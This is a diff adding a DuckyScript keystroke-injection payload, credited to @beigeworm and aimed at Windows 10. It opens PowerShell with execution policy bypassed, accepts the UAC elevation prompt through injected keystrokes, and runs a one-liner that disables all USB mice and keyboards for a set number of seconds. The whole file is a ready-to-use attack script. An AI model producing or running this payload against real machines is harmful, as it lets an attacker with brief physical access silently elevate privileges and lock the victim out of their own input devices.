@@ -1,0 +1,22 @@
+REM Title: beigeworm's Mouse and Keyboard Killer.
+REM Author: @beigeworm
+REM Description: This script Disables mouse and keyboard input for a number of seconds.
+REM Target: Windows 10
+
+REM Setup: Change $WaitTime to desired amount of seconds..
+
+REM some setup for dukie script
+DEFAULT_DELAY 100
+
+REM open powershell
+DELAY 1000
+GUI r
+DELAY 750
+STRING powershell -NoP -Ep Bypass
+CTRL-SHIFT ENTER
+DELAY 2500
+ALT y
+DELAY 5000
+
+STRING $WaitTime = 60 ;$PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'};$PNPMice.Disable();$PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'};$PNPKeyboard.Disable();Sleep $WaitTime;$PNPMice.Enable();$PNPKeyboard.Enable();exit
+ENTER
